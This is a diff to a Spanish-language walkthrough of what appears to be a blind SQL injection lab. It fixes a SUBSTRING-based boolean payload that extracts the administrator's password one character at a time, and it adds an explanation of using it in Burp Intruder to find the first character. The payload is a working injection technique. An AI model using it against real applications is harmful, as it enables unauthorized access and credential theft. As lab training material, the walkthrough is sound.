@@ -139,6 +139,15 @@ Para posición `i` probar caracteres `c` hasta encontrar el verdadero:
 
 Payload
 ```sql
-' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='s
+' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
 ```
+
+El mismo lo utilizamos en el intruder:
+<img width="1916" height="903" alt="image" src="https://github.com/user-attachments/assets/2cd3e3fe-acf1-4c79-992f-fecd11c65a1f" />
+
+Vemos que hay una sola petición con length diferente, correspondiente al payload `6`, la cual nos devuelve el mensaje `Welcome back!`:
+<img width="1852" height="893" alt="image" src="https://github.com/user-attachments/assets/c844727b-18c2-48c5-a5c9-ebf51c0ca38c" />
+
+Por lo que ya sabemos que nuestro primer caracter es `6`.
+
 
